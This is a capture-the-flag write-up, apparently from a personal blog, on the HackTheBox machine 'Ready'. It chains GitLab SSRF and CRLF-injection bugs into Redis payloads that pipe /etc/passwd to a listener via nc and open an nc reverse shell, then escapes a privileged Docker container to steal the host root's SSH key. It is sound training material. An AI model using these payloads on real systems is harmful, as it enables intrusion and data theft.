<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="index, follow"><title>HackTheBox - Ready | Ef's log</title><meta name=keywords content="HackTheBox,CTF,Cyber Security,Pentesting"><meta name=description content="Turns SSRF to remote code execution and escape from a Docker container"><meta name=author content="Fahmi FJ"><link rel=canonical href=https://fahmifj.github.io/hackthebox/ready/><meta name=google-site-verification content="LlCRq--iL8r1HTz1DMbMvQyX2lZjWD-KnwFeO_OWlg8"><link crossorigin=anonymous href=https://fahmifj.github.io/assets/css/stylesheet.min.bd459bfe4940cb0279a97213c67be3816bd3751510c3b6af22df24e8740767ba.css integrity="sha256-vUWb/klAywJ5qXITxnvjgWvTdRUQw7avIt8k6HQHZ7o=" rel="preload stylesheet" as=style><link crossorigin=anonymous rel=preload as=fetch href=https://fahmifj.github.io/index.json><script defer crossorigin=anonymous src=https://fahmifj.github.io/assets/js/search.min.dbf3c8b1e1d3feb24da21a556bdfb2f51a0273aa11efcd4640113536ee29d424.js integrity="sha256-2/PIseHT/rJNohpVa9+y9RoCc6oR781GQBE1Nu4p1CQ="></script>
<script defer crossorigin=anonymous src=https://fahmifj.github.io/assets/js/highlight.min.22059b46810f6ad868c7821e09643fcd3324a7aece939a3b9d810ddf8cc89e0d.js integrity="sha256-IgWbRoEPathox4IeCWQ/zTMkp67Ok5o7nYEN34zIng0=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://fahmifj.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://fahmifj.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://fahmifj.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://fahmifj.github.io/apple-touch-icon.png><link rel=mask-icon href=https://fahmifj.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><meta name=generator content="Hugo 0.102.1"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:#1d1e20;--entry:#2e2e33;--primary:rgba(255, 255, 255, 0.84);--secondary:rgba(255, 255, 255, 0.56);--tertiary:rgba(255, 255, 255, 0.16);--content:rgba(255, 255, 255, 0.74);--hljs-bg:#2e2e33;--code-bg:#37383e;--border:#333}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script async src="https://www.googletagmanager.com/gtag/js?id=G-PDN0GP97D1"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-PDN0GP97D1",{anonymize_ip:!1})}</script><meta property="og:title" content="HackTheBox - Ready"><meta property="og:description" content="Turns SSRF to remote code execution and escape from a Docker container"><meta property="og:type" content="article"><meta property="og:url" content="https://fahmifj.github.io/hackthebox/ready/"><meta property="og:image" content="https://fahmifj.github.io/hackthebox/ready/imgs/image-20210514231405552.png"><meta property="article:section" content="hackthebox"><meta property="article:published_time" content="2021-05-15T22:00:39+07:00"><meta property="article:modified_time" content="2021-05-15T22:00:39+07:00"><meta property="og:see_also" content="https://fahmifj.github.io/hackthebox/ophiuchi/"><meta property="og:see_also" content="https://fahmifj.github.io/hackthebox/traverxec/"><meta property="og:see_also" content="https://fahmifj.github.io/hackthebox/heist/"><meta property="og:see_also" content="https://fahmifj.github.io/hackthebox/active/"><meta property="og:see_also" content="https://fahmifj.github.io/hackthebox/shocker/"><meta property="og:see_also" content="https://fahmifj.github.io/hackthebox/atom/"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://fahmifj.github.io/hackthebox/ready/imgs/image-20210514231405552.png"><meta name=twitter:title content="HackTheBox - Ready"><meta name=twitter:description content="Turns SSRF to remote code execution and escape from a Docker container"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"HackTheBox","item":"https://fahmifj.github.io/hackthebox/"},{"@type":"ListItem","position":2,"name":"HackTheBox - Ready","item":"https://fahmifj.github.io/hackthebox/ready/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"HackTheBox - Ready","name":"HackTheBox - Ready","description":"Turns SSRF to remote code execution and escape from a Docker container","keywords":["HackTheBox","CTF","Cyber Security","Pentesting"],"articleBody":"Ready from HackTheBox features a GitLab instance in a Docker container. Chaining two GitLab CVEs (CVE-2018-19571 \u0026 CVE-2018-19585) allows me to gain a foothold on the container. Enumerating the container discovers a password that can be used on the container’s root account. Since the container running in privileged mode, it is possible to mount the host file system into the container.\nSkills Learned GitLab 11.4.7 exploitation Chaining bugs from CVE-2018-19571 and CVE-2018-19585 Docker security Tools Kali Linux (Attacking Machine) - https://www.kali.org/ Nmap - Preinstalled in Kali Linux BurpSuite - Preinstalled in Kali Linux Reconnaissance Nmap All ports scan with nmap discovers two open ports: SSH on port 22, and a HTTP web server on port 5080\n→ root@kali «ready» «10.10.14.20» $ nmap -p- -sV --reason -oA nmap/10-initial-ready '10.10.10.220' Starting Nmap 7.80 ( https://nmap.org ) at 2021-05-14 04:53 EDT Nmap scan report for 10.10.10.220 Host is up, received echo-reply ttl 63 (0.18s latency). Not shown: 65533 closed ports Reason: 65533 resets PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) 5080/tcp open http syn-ack ttl 62 nginx Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 503.44 seconds After performing a default script scan shows there’s a GitLab instance on port 5080.\n→ root@kali «ready» «10.10.14.20» $ nmap -p22,5080 -sC -sV --reason -oA nmap/10-default-ready 10.10.10.220 Starting Nmap 7.80 ( https://nmap.org ) at 2021-05-14 05:17 EDT Nmap scan report for 10.10.10.220 Host is up, received echo-reply ttl 63 (0.090s latency). PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) 5080/tcp open http syn-ack ttl 62 nginx | http-robots.txt: 53 disallowed entries (15 shown) | / /autocomplete/users /search /api /admin /profile | /dashboard /projects/new /groups/new /groups/*/edit /users /help |_/s/ /snippets/new /snippets/*/edit | http-title: Sign in \\xC2\\xB7 GitLab |_Requested resource was http://10.10.10.220:5080/users/sign_in |_http-trane-info: Problem with XML parsing of /evox/about Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 14.70 seconds Enumeration TCP 5080 - GitLab The page displays a self-hosted GitLab Community Edition.\nI can register with any email domain.\nThe GitLab version can be seen by visiting/help, and it seems to be an outdated one.\nI’ll take a note on the version.\nUser Enumeration via GitLab API I can enumerate the GitLab users via /api/v4/users, but in the end, this was not used.\nI’ll move and search for vulnerabilities.\nSearchsploit I can feed the GitLab version to searchsploit, and it returns with two exploits that match with the version.\n→ root@kali «~» «10.10.14.20» $ searchsploit GitLab 11.4.7 -------------------------------------------------------------------------- --------------------------------- Exploit Title | Path -------------------------------------------------------------------------- --------------------------------- GitLab 11.4.7 - RCE (Authenticated) (2) | ruby/webapps/49334.py GitLab 11.4.7 - Remote Code Execution (Authenticated) (1) | ruby/webapps/49257.py -------------------------------------------------------------------------- --------------------------------- I relaxed the keyword to find other potential exploits, and I found an arbitrary file read which previously was used to exploit Laboratory.\n→ root@kali «exploit» «10.10.14.20» $ searchsploit GitLab -------------------------------------------------------------------------- --------------------------------- Exploit Title | Path -------------------------------------------------------------------------- --------------------------------- GitLab - 'impersonate' Feature Privilege Escalation | ruby/webapps/40236.txt GitLab 11.4.7 - RCE (Authenticated) (2) | ruby/webapps/49334.py GitLab 11.4.7 - Remote Code Execution (Authenticated) (1) | ruby/webapps/49257.py GitLab 12.9.0 - Arbitrary File Read | ruby/webapps/48431.txt Gitlab 12.9.0 - Arbitrary File Read (Authenticated) | ruby/webapps/49076.py Gitlab 6.0 - Persistent Cross-Site Scripting | php/webapps/30329.sh Gitlab-shell - Code Execution (Metasploit) | linux/remote/34362.rb Jenkins Gitlab Hook Plugin 1.4.2 - Reflected Cross-Site Scripting | java/webapps/47927.txt NPMJS gitlabhook 0.0.17 - 'repository' Remote Command Execution | json/webapps/47420.txt -------------------------------------------------------------------------- --------------------------------- Foothold Shell as git GitLab 11.4.7 RCE (CVE-2018-19571 \u0026 CVE-2018-19585) - PoC The RCE exploit that was popped on searchsploit above is consist of two vulnerabilities, SSRF (CVE-2018-19571) and CRLF Injection (CVE-2018-19585). The exploit’s author uses the LifeOverFlow’s blog post as reference. So I decided to read that blog and try to reproduce it here.\nWith SSRF, you can talk with the internal Redis server on port 6379 that used by GitLab as database, cache and message broker. If there is an HTTP request sent to the Redis server using SSRF, the request would read as follows (# ==\u003e is a comment by me)\nGET blablabla HTTP/1.1 # ==\u003e Redis read this as a command Host: [0:0:0:0:0:ffff:127.0.0.1]:6379 User-Agent: git/2.18.1 Accept: */* Accept-Encoding: deflate, gzip Pragma: no-cache - Err wrong number of arguments for 'get' command The idea here is to leverage the Import project feature from GitLab to talk to Redis server, and insert a payload in the URL using CRLF injection.\nOn GitLab, I’ll import a (non-exist) project and choose the “Repo by URL” menu.\nI’ll be using the same SSRF payload to bypass the GitLab URL filter which is git://[0:0:0:0:0:ffff:127.0.0.1]:6379/ and add my (non-exist) .git repository at the end of the URL, so it becomes git://[0:0:0:0:0:ffff:127.0.0.1]:6379/iamf/ssrf-test.git\nThe repository URL above is a special IPv6 address where its last 32 bits is used to embed the IPv4 address. The URL was used to bypass the SSRF protection defined in spec/lib/gitlab/url_blocker_spec.rb\nI’ll intercept the request after I hit the “Create Project” button, and then on Burp Suite, I’ll replace the import URL with the following:\ngit://[0:0:0:0:0:ffff:127.0.0.1]:6379/iamf/ multi sadd resque:gitlab:queues system_hook_push lpush resque:gitlab:queue:system_hook_push \"{\\\"class\\\":\\\"GitlabShellWorker\\\",\\\"args\\\":[\\\"class_eval\\\",\\\"open(\\'|cat /etc/passwd | nc 10.10.14.20 9000\\').read\\\"],\\\"retry\\\":3,\\\"queue\\\":\\\"system_hook_push\\\",\\\"jid\\\":\\\"ad52abc5641173e217eb2e52\\\",\\\"created_at\\\":1513714403.8122594,\\\"enqueued_at\\\":1513714403.8129568}\" exec exec /ssrf-test.git So the full request now looks like this:\nPOST /projects HTTP/1.1 Host: 10.10.10.220:5080 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: http://10.10.10.220:5080/projects/new Content-Type: application/x-www-form-urlencoded Content-Length: 778 Connection: close Cookie: sidebar_collapsed=false; _gitlab_session=4426e39af6c1d3d4a4484a8a53f0bac9; event_filter=all Upgrade-Insecure-Requests: 1 utf8=%E2%9C%93\u0026authenticity_token=cbS9UXXZDmvTgBUhOTMxF%2FOSii%2FgetcSbM%2FNTT2dG6NllhoQsV8uvbDU65arU9dEOumftKI48ZaDBi6rnJbjOQ%3D%3D\u0026project%5Bimport_url%5D= git://[0:0:0:0:0:ffff:127.0.0.1]:6379/iamf/ multi sadd resque:gitlab:queues system_hook_push lpush resque:gitlab:queue:system_hook_push \"{\\\"class\\\":\\\"GitlabShellWorker\\\",\\\"args\\\":[\\\"class_eval\\\",\\\"open(\\'|cat /etc/passwd | nc 10.10.14.20 9000\\').read\\\"],\\\"retry\\\":3,\\\"queue\\\":\\\"system_hook_push\\\",\\\"jid\\\":\\\"ad52abc5641173e217eb2e52\\\",\\\"created_at\\\":1513714403.8122594,\\\"enqueued_at\\\":1513714403.8129568}\" exec exec /ssrf-test.git\u0026project%5Bci_cd_only%5D=false\u0026project%5Bname%5D=SSRF+test\u0026project%5Bnamespace_id%5D=5\u0026project%5Bpath%5D=ssrf-test\u0026project%5Bdescription%5D=\u0026project%5Bvisibility_level%5D=0 When I hit the send button, my listener obtains the file contents of /etc/passwd.\nroot@kali «exploit» «10.10.14.20» $ nc -nvlp 9000 listening on [any] 9000 ... connect to [10.10.14.20] from (UNKNOWN) [10.10.10.220] 36612 ...... git:x:998:998::/var/opt/gitlab:/bin/sh gitlab-www:x:999:999::/var/opt/gitlab/nginx:/bin/false gitlab-redis:x:997:997::/var/opt/gitlab/redis:/bin/false gitlab-psql:x:996:996::/var/opt/gitlab/postgresql:/bin/sh mattermost:x:994:994::/var/opt/gitlab/mattermost:/bin/sh registry:x:993:993::/var/opt/gitlab/registry:/bin/sh gitlab-prometheus:x:992:992::/var/opt/gitlab/prometheus:/bin/sh gitlab-consul:x:991:991::/var/opt/gitlab/consul:/bin/sh dude:x:1000:1000::/home/dude:/bin/bash Weaponize - Reverse Shell From here, I’ll reproduce the step above, but this time I’ll send myself a shell. The payload as follows.\ngit://[0:0:0:0:0:ffff:127.0.0.1]:6379/iamf/ multi sadd resque:gitlab:queues system_hook_push lpush resque:gitlab:queue:system_hook_push \"{\\\"class\\\":\\\"GitlabShellWorker\\\",\\\"args\\\":[\\\"class_eval\\\",\\\"open(\\'|nc -e /bin/bash 10.10.14.20 9000\\').read\\\"],\\\"retry\\\":3,\\\"queue\\\":\\\"system_hook_push\\\",\\\"jid\\\":\\\"ad52abc5641173e217eb2e52\\\",\\\"created_at\\\":1513714403.8122594,\\\"enqueued_at\\\":1513714403.8129568}\" exec exec /ssrf-to-rce.git On my nc listener:\n→ root@kali «exploit» «10.10.14.20» $ nc -nvlp 9000 listening on [any] 9000 ... connect to [10.10.14.20] from (UNKNOWN) [10.10.10.220] 37306 id uid=998(git) gid=998(git) groups=998(git) hostname gitlab.example.com pwd /var/opt/gitlab/gitlab-rails/working Shell Upgrade I’ll do the ‘stty’ trick to upgrade my shell.\nwhich python3 /opt/gitlab/embedded/bin/python3 python3 -c 'import pty;pty.spawn(\"/bin/bash\")' git@gitlab:~/gitlab-rails/working$ ^Z [2] + 2354 suspended nc -nvlp 9000 → root@kali «exploit» «10.10.14.20» $ stty raw -echo; fg [2] - 2354 continued nc -nvlp 9000 git@gitlab:~/gitlab-rails/working$ git@gitlab:~/gitlab-rails/working$ export TERM=xterm On /home, there is only one user called dude, and I’m able to read the user flag there.\ngit@gitlab:/home/dude$ ls -la total 24 drwxr-xr-x 2 dude dude 4096 Dec 7 16:58 . drwxr-xr-x 1 root root 4096 Dec 2 10:45 .. lrwxrwxrwx 1 root root 9 Dec 7 16:58 .bash_history -\u003e /dev/null -rw-r--r-- 1 dude dude 220 Aug 31 2015 .bash_logout -rw-r--r-- 1 dude dude 3771 Aug 31 2015 .bashrc -rw-r--r-- 1 dude dude 655 May 16 2017 .profile -r--r----- 1 dude git 33 Dec 2 10:46 user.txt git@gitlab:/home/dude$ cat user.txt e1e30b052b6ec0670698...... Privilege Escalation Container - Shell as root Enumeration I found a .dockerenv on the root directory which indicates that I’m inside container, and there is also a file called root_pass.\ngit@gitlab:~$ ls -la / total 104 drwxr-xr-x 1 root root 4096 Dec 1 12:41 . drwxr-xr-x 1 root root 4096 Dec 1 12:41 .. -rwxr-xr-x 1 root root 0 Dec 1 12:41 .dockerenv ...... -rw-r--r-- 1 root root 23 Jun 29 2020 root_pass The content of root_pass is a random string, which I think it is a password. I tried it to the user and root account but it didn’t work.\ngit@gitlab:/opt/backup$ cat /root_pass YG65407Bjqvv9A0a8Tm_7w Exploring on /opt, I found a folder called backup. The folder contains three files: docker-compose.yml, gitlab-secrets.json and gitlab.rb.\ngit@gitlab:/opt/backup$ ls -l total 100 -rw-r--r-- 1 root root 872 Dec 7 09:25 docker-compose.yml -rw-r--r-- 1 root root 15092 Dec 1 16:23 gitlab-secrets.json -rw-r--r-- 1 root root 79639 Dec 1 19:20 gitlab.rb Upon performing a recursive grep to search for files containing a “pass” string inside the folder, I discovered an SMTP password on gitlab.rb.\ngit@gitlab:/opt/backup$ grep -Ri \"pass\" ...... gitlab.rb:gitlab_rails['smtp_password'] = \"wW59U!ZKMbG9+*#h\" ...... Looking into the docker-compose.yml, I see a potential vector for container breakout.\ngit@gitlab:/opt/backup$ cat docker-compose.yml version: '2.4' services: web: image: 'gitlab/gitlab-ce:11.4.7-ce.0' restart: always hostname: 'gitlab.example.com' environment: GITLAB_OMNIBUS_CONFIG: | external_url 'http://172.19.0.2' redis['bind']='127.0.0.1' redis['port']=6379 gitlab_rails['initial_root_password']=File.read('/root_pass') networks: gitlab: ipv4_address: 172.19.0.2 ports: - '5080:80' #- '127.0.0.1:5080:80' #- '127.0.0.1:50443:443' #- '127.0.0.1:5022:22' volumes: - './srv/gitlab/config:/etc/gitlab' - './srv/gitlab/logs:/var/log/gitlab' - './srv/gitlab/data:/var/opt/gitlab' - './root_pass:/root_pass' privileged: true # ==\u003e Potential privesc vector restart: unless-stopped #mem_limit: 1024m networks: gitlab: driver: bridge ipam: config: - subnet: 172.19.0.0/16 su - root (container) The password wW59U!ZKMbG9+*#h works on the container root account\ngit@gitlab:/opt/gitlab$ su root Password: wW59U!ZKMbG9+*#h root@gitlab:/opt/gitlab# id uid=0(root) gid=0(root) groups=0(root) Host - Shell as root Docker Breakout - CAP_SYS_ADMIN Based on the docker-compose.yml file, I suspect the container is running with privileged flag. According to my favorite blog, which is BookHackTrick, a container with privileged flag will have access to the host devices.\nMake sure I have access to the host devices, I can run capsh --print.\nroot@gitlab:/opt/gitlab# capsh --print Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37+eip ...... There is a CAP_SYS_ADMIN, with this capabilities I’m able to mount the host devices to make it available on the container. I can list all the host devices with fdisk -l.\nroot@gitlab:~# fdisk -l ...... Disk /dev/sda: 20 GiB, 21474836480 bytes, 41943040 sectors Units: sectors of 1 * 512 = 512 bytes Sector size (logical/physical): 512 bytes / 512 bytes I/O size (minimum/optimal): 512 bytes / 512 bytes Disklabel type: gpt Disk identifier: 32558524-85A4-4072-AA28-FA341BE86C2E Device Start End Sectors Size Type /dev/sda1 2048 4095 2048 1M BIOS boot /dev/sda2 4096 37746687 37742592 18G Linux filesystem # the root (/) dir /dev/sda3 37746688 41940991 4194304 2G Linux swap Now I can simply mount the Linux filesystem (/dev/sda2) to my specified folder.\nroot@gitlab:/media# mkdir iamf root@gitlab:/media# mount /dev/sda2 /media/iamf root@gitlab:/media# ls iamf/ bin cdrom etc lib lib64 lost+found mnt proc run snap sys usr boot dev home lib32 libx32 media opt root sbin srv tmp var The root user of the host has SSH keys, I’ll grab only the private key to my machine.\nroot@gitlab:/media# ls -l iamf/root/.ssh/ total 12 -rw------- 1 root root 405 Dec 7 16:49 authorized_keys -rw------- 1 root root 1675 Dec 7 16:49 id_rsa -rw-r--r-- 1 root root 405 Dec 7 16:49 id_rsa.pub root@gitlab:/media# cat iamf/root/.ssh/id_rsa -----BEGIN RSA PRIVATE KEY----- MIIEowIBAAKCAQEAvyovfg++zswQT0s4YuKtqxOO6EhG38TR2eUaInSfI1rjH09Q sle1ivGnwAUrroNAK48LE70Io13DIfE9rxcotDviAIhbBOaqMLbLnfnnCNLApjCn ...[SNIP]... vJzok/kcmwcBlGfmRKxlS0O6n9dAiOLY46YdjyS8F8hNPOKX6rCd -----END RSA PRIVATE KEY----- SSH Access - root (host) After changing the key permissions to 600, I can login as root user.\n→ root@kali «exploit» «10.10.14.20» $ ssh -i root_rsa root@10.10.10.220 Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-40-generic x86_64) ..... System load: 0.05 Usage of /: 67.1% of 17.59GB Memory usage: 84% Swap usage: 4% Processes: 434 Users logged in: 0 IPv4 address for br-bcb73b090b3f: 172.19.0.1 IPv4 address for docker0: 172.17.0.1 IPv4 address for ens160: 10.10.10.220 IPv6 address for ens160: dead:beef::250:56ff:feb9:211 ..... Last login: Thu Feb 11 14:28:18 2021 root@ready:~# id uid=0(root) gid=0(root) groups=0(root) I can also grab the root flag.\nroot@ready:~# cut -c-15 root.txt b7f98681505cd39 ","wordCount":"1869","inLanguage":"en","image":"https://fahmifj.github.io/hackthebox/ready/imgs/image-20210514231405552.png","datePublished":"2021-05-15T22:00:39+07:00","dateModified":"2021-05-15T22:00:39+07:00","author":{"@type":"Person","name":"Fahmi FJ"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://fahmifj.github.io/hackthebox/ready/"},"publisher":{"@type":"Organization","name":"Ef's log","logo":{"@type":"ImageObject","url":"https://fahmifj.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class="header sticky"><nav id=navbar class=nav><div class=logo><a href=https://fahmifj.github.io/ accesskey=h title="Fahmi FJ">F's log</a></div><ul id=menu onscroll=menu_on_scroll()><li><a href=https://fahmifj.github.io/blog/ title=blog>blog</a></li><li><a href=https://fahmifj.github.io/ctf/ title=ctf>ctf</a></li><li><a href=https://fahmifj.github.io/series/ title=series>series</a></li><li><a href=https://fahmifj.github.io/archives/ title=archives>archives</a></li></ul><div class=search-container><div id=searchBox><input class=searchInput id=searchInput aria-label=search type=search><div class=searchResults-container><span class="search-results hidden" id=searchResults aria-label="search results"></span></div></div><button id=theme-toggle accesskey=t title><svg id="moon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></nav></header><div id=mask></div><main class=main><div class=content-wrapper><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://fahmifj.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://fahmifj.github.io/hackthebox/>HackTheBox</a></div><h1 class=post-title>HackTheBox - Ready</h1><p class=post-description>Turns SSRF to remote code execution and escape from a Docker container</p><div class=post-meta><span class=author>Fahmi FJ</span>&nbsp;&#183;&nbsp;<span class=date>May 15, 2021</span>&nbsp;&#183;&nbsp;<span class=meta-read>9 min read</span></div><hr><div class=series-info>Series:&nbsp;<a href=https://fahmifj.github.io/series/oscp-like/>OSCP like</a></div></header><div class=post-content-container><aside class=toc><div class=inner><ul><li><a href=#reconnaissance aria-label=Reconnaissance>Reconnaissance</a><ul><li><a href=#nmap aria-label=Nmap>Nmap</a></li></ul></li><li><a href=#enumeration aria-label=Enumeration>Enumeration</a><ul><li><a href=#tcp-5080---gitlab aria-label="TCP 5080 - GitLab">TCP 5080 - GitLab</a></li></ul></li><li><a href=#foothold aria-label=Foothold>Foothold</a><ul><li><a href=#shell-as-git aria-label="Shell as git">Shell as git</a></li></ul></li><li><a href=#privilege-escalation aria-label="Privilege Escalation">Privilege Escalation</a><ul><li><a href=#container---shell-as-root aria-label="Container - Shell as root">Container - Shell as root</a></li><li><a href=#host---shell-as-root aria-label="Host - Shell as root">Host - Shell as root</a></li></ul></li></ul></div></aside><div class=post-content><figure class=entry-cover><img srcset="https://fahmifj.github.io/hackthebox/ready/imgs/image-20210514231405552_hu088002f060cc993a067f8948a00aa6b9_157417_360x0_resize_box_3.png 360w ,https://fahmifj.github.io/hackthebox/ready/imgs/image-20210514231405552_hu088002f060cc993a067f8948a00aa6b9_157417_480x0_resize_box_3.png 480w ,https://fahmifj.github.io/hackthebox/ready/imgs/image-20210514231405552_hu088002f060cc993a067f8948a00aa6b9_157417_720x0_resize_box_3.png 720w ,https://fahmifj.github.io/hackthebox/ready/imgs/image-20210514231405552.png 739w" sizes="(min-width: 768px) 720px, 100vw" src=https://fahmifj.github.io/hackthebox/ready/imgs/image-20210514231405552.png alt="HackTheBox - Ready" width=739 height=473><p>HackTheBox - Ready</p></figure><p>Ready from HackTheBox features a GitLab instance in a Docker container. Chaining two GitLab CVEs (CVE-2018-19571 & CVE-2018-19585) allows me to gain a foothold on the container. Enumerating the container discovers a password that can be used on the container&rsquo;s root account. Since the container running in privileged mode, it is possible to mount the host file system into the container.</p><h4 id=skills-learned>Skills Learned<a class=anchor aria-hidden=true href=#skills-learned>#</a></h4><ul><li>GitLab 11.4.7 exploitation</li><li>Chaining bugs from CVE-2018-19571 and CVE-2018-19585</li><li>Docker security</li></ul><h4 id=tools>Tools<a class=anchor aria-hidden=true href=#tools>#</a></h4><ul><li>Kali Linux (Attacking Machine) - <a href=https://www.kali.org/>https://www.kali.org/</a></li><li>Nmap - Preinstalled in Kali Linux</li><li>BurpSuite - Preinstalled in Kali Linux</li></ul><h2 id=reconnaissance>Reconnaissance<a class=anchor aria-hidden=true href=#reconnaissance>#</a></h2><h3 id=nmap>Nmap<a class=anchor aria-hidden=true href=#nmap>#</a></h3><p>All ports scan with <code>nmap</code> discovers two open ports: SSH on port 22, and a HTTP web server on port 5080</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@kali «ready» «10.10.14.20» 
</span></span><span class=line><span class=cl>$ nmap -p- -sV --reason -oA nmap/10-initial-ready <span class=s1>&#39;10.10.10.220&#39;</span>
</span></span><span class=line><span class=cl>Starting Nmap 7.80 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2021-05-14 04:53 EDT
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.10.10.220
</span></span><span class=line><span class=cl>Host is up, received echo-reply ttl <span class=m>63</span> <span class=o>(</span>0.18s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>Not shown: <span class=m>65533</span> closed ports
</span></span><span class=line><span class=cl>Reason: <span class=m>65533</span> resets
</span></span><span class=line><span class=cl>PORT     STATE SERVICE REASON         VERSION
</span></span><span class=line><span class=cl>22/tcp   open  ssh     syn-ack ttl <span class=m>63</span> OpenSSH 8.2p1 Ubuntu <span class=m>4</span> <span class=o>(</span>Ubuntu Linux<span class=p>;</span> protocol 2.0<span class=o>)</span>
</span></span><span class=line><span class=cl>5080/tcp open  http    syn-ack ttl <span class=m>62</span> nginx
</span></span><span class=line><span class=cl>Service Info: OS: Linux<span class=p>;</span> CPE: cpe:/o:linux:linux_kernel
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 503.44 seconds
</span></span></code></pre></div><p>After performing a default script scan shows there&rsquo;s a GitLab instance on port 5080.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@kali «ready» «10.10.14.20» 
</span></span><span class=line><span class=cl>$ nmap -p22,5080 -sC -sV --reason -oA nmap/10-default-ready 10.10.10.220
</span></span><span class=line><span class=cl>Starting Nmap 7.80 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2021-05-14 05:17 EDT
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.10.10.220
</span></span><span class=line><span class=cl>Host is up, received echo-reply ttl <span class=m>63</span> <span class=o>(</span>0.090s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>PORT     STATE SERVICE REASON         VERSION
</span></span><span class=line><span class=cl>22/tcp   open  ssh     syn-ack ttl <span class=m>63</span> OpenSSH 8.2p1 Ubuntu <span class=m>4</span> <span class=o>(</span>Ubuntu Linux<span class=p>;</span> protocol 2.0<span class=o>)</span>
</span></span><span class=line><span class=cl>5080/tcp open  http    syn-ack ttl <span class=m>62</span> nginx
</span></span><span class=line><span class=cl><span class=p>|</span> http-robots.txt: <span class=m>53</span> disallowed entries <span class=o>(</span><span class=m>15</span> shown<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> / /autocomplete/users /search /api /admin /profile 
</span></span><span class=line><span class=cl><span class=p>|</span> /dashboard /projects/new /groups/new /groups/*/edit /users /help 
</span></span><span class=line><span class=cl><span class=p>|</span>_/s/ /snippets/new /snippets/*/edit
</span></span><span class=line><span class=cl><span class=p>|</span> http-title: Sign in <span class=se>\x</span>C2<span class=se>\x</span>B7 GitLab
